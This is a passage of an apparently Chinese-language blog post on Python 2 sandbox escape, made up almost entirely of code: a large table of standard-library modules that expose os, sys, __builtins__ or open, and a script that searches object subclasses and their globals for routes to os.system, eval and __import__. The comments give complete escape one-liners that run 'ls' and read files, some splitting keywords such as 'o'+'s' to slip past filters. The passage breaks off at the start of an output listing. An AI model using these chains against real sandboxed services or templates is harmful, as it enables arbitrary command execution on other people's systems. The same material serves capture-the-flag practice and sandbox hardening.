class="string">'SocketServer'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-darwin'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'zipfile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'repr'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'wave'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'curses'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'antigravity'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'plat-irix6'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-freebsd6'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'plat-freebsd7'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-freebsd4'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'plat-freebsd5'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-freebsd8'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'aifc'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'sndhdr'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'cookielib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ConfigParser'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'httplib'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'_MozillaCookieJar'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'bisect'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'decimal'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'cmd'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'binhex'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sunau'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'pydoc'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'plat-riscos'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'token'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'Bastion'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'msilib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'shlex'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'quopri'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'multiprocessing'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'dummy_threading'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'dircache'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'asyncore'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pkgutil'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'compileall'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'SimpleHTTPServer'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'locale'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'chunk'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'macpath'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'popen2'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'mimetypes'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'toaiff'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'atexit'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pydoc_data'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tabnanny'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'HTMLParser'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'encodings'</span>: [<span class="string">'codecs'</span>, <span class="string">'__builtins__'</span>], <span class="string">'BaseHTTPServer'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'calendar'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'mailcap'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-unixware7'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'abc'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'plistlib'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'bdb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'py_compile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</span><br><span class="line">                <span class="string">'pipes'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'rfc822'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tarfile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'struct'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'urllib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'fpformat'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'re'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'compile'</span>], <span class="string">'mutex'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'ntpath'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'UserString'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'new'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'formatter'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'email'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'cgi'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'ftplib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-linux2'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'ast'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'optparse'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'UserDict'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'inspect'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'mailbox'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'Queue'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'fnmatch'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ctypes'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'codecs'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'getopt'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'md5'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'cgitb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'commands'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'logging'</span>: [<span class="string">'os'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'socket'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-irix5'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sre'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</span><br><span class="line">                <span class="string">'ensurepip'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'DocXMLRPCServer'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'traceback'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'netrc'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'wsgiref'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-generic'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'weakref'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'ihooks'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'telnetlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'doctest'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pstats'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'smtpd'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'_pyio'</span>: [<span class="string">'os'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'dis'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'os'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'pdb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'this'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'base64'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'os2emxpath'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'glob'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'unittest'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'dummy_thread'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'fileinput'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'__future__'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'robotparser'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'plat-mac'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_threading_local'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_LWPCookieJar'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'wsgiref.egg-info'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sha'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'sre_constants'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'json'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'Cookie'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tokenize'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'plat-beos5'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'rexec'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'lib-tk'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'textwrap'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'fractions'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sqlite3'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'posixfile'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'imaplib'</span>: [<span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'xdrlib'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'imghdr'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'macurl2path'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_osx_support'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'webbrowser'</span>: [<span class="string">'os'</span>, <span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'plat-netbsd1'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'nturl2path'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tkinter'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'copy'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'pickletools'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'hashlib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'anydbm'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'keyword'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'timeit'</span>: [<span class="string">'timeit'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'uu'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'StringIO'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'modulefinder'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'stringprep'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'markupbase'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'colorsys'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'shelve'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'multifile'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sre_parse'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pickle'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'plat-os2emx'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'mimetools'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'audiodev'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'copy_reg'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'sre_compile'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'compile'</span>], <span class="string">'CGIHTTPServer'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'idlelib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'site'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'getpass'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'imputil'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'bsddb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'contextlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'numbers'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'io'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'plat-sunos5'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'symtable'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pyclbr'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'shutil'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'lib2to3'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'threading'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'dbhash'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'gettext'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'dumbdbm'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'_weakrefset'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_abcoll'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'MimeWriter'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'test'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'opcode'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'csv'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'nntplib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'profile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'genericpath'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'stat'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'__phello__.foo'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'sched'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'statvfs'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'trace'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'warnings'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'symbol'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sets'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'htmlentitydefs'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'urllib2'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'SimpleXMLRPCServer'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sunaudio'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pdb.doc'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'asynchat'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'user'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'xmllib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'codeop'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'plat-next3'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'types'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'argparse'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'uuid'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-aix4'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'plat-aix3'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'ssl'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'poplib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'xmlrpclib'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'difflib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'urlparse'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'linecache'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_strptime'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'htmllib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'site-packages'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'posixpath'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'stringold'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'gzip'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'mhlib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'rlcompleter'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'hmac'</span>: [<span class="string">'__builtins__'</span>]&#125;</span><br><span class="line">target_modules = [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'subprocess'</span>, <span class="string">'timeit'</span>, <span class="string">'importlib'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>]</span><br><span class="line">target_functions = [<span class="string">'__import__'</span>, <span class="string">'__builtins__'</span>, <span class="string">'exec'</span>, <span class="string">'eval'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'file'</span>, <span class="string">'open'</span>]</span><br><span class="line">all_targets = list(set(find_modules.keys() + target_modules + target_functions))</span><br><span class="line">all_modules = list(set(find_modules.keys() + target_modules))</span><br><span class="line">subclasses = ().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">sub_name = [s.__name__ <span class="keyword">for</span> s <span class="keyword">in</span> subclasses]</span><br><span class="line"><span class="comment"># 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()</span></span><br><span class="line">print(<span class="string">'----------1-----------'</span>)</span><br><span class="line"><span class="keyword">for</span> i, s <span class="keyword">in</span> enumerate(sub_name):</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">        <span class="keyword">if</span> f == s:</span><br><span class="line">            <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                print(i, f)</span><br><span class="line">            <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                target = find_modules[f]</span><br><span class="line">                sub_dict = subclasses[i].__dict__</span><br><span class="line">                <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                    <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                        print(i, f, target)</span><br><span class="line">print(<span class="string">'----------2-----------'</span>)</span><br><span class="line"><span class="comment"># 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')</span></span><br><span class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> enumerate(subclasses):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        more = sub.__init__.func_globals</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> m <span class="keyword">in</span> more:</span><br><span class="line">                print(i, sub, m, find_modules.get(m))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">print(<span class="string">'----------3-----------'</span>)</span><br><span class="line"><span class="comment"># 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").system("ls")')</span></span><br><span class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> enumerate(subclasses):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        more = sub.__init__.func_globals.values()</span><br><span class="line">        <span class="keyword">for</span> j, v <span class="keyword">in</span> enumerate(more):</span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> f <span class="keyword">in</span> v:</span><br><span class="line">                        <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                            print(i, j, sub, f)</span><br><span class="line">                        <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                            target = find_modules.get(f)</span><br><span class="line">                            sub_dict = v[f].__dict__</span><br><span class="line">                            <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                                <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                                    print(i, j, sub, f, target)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">print(<span class="string">'----------4-----------'</span>)</span><br><span class="line"><span class="comment"># 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']("os").system("ls")</span></span><br><span class="line"><span class="comment"># &lt;class 'warnings.catch_warnings'&gt;类很特殊，在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似</span></span><br><span class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> enumerate(subclasses):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        more = sub()._module.__builtins__</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> f <span class="keyword">in</span> more:</span><br><span class="line">                print(i, f)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h4 id="运行结果如下："><a href="#运行结果如下：" class="headerlink" title="运行结果如下："></a>运行结果如下：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 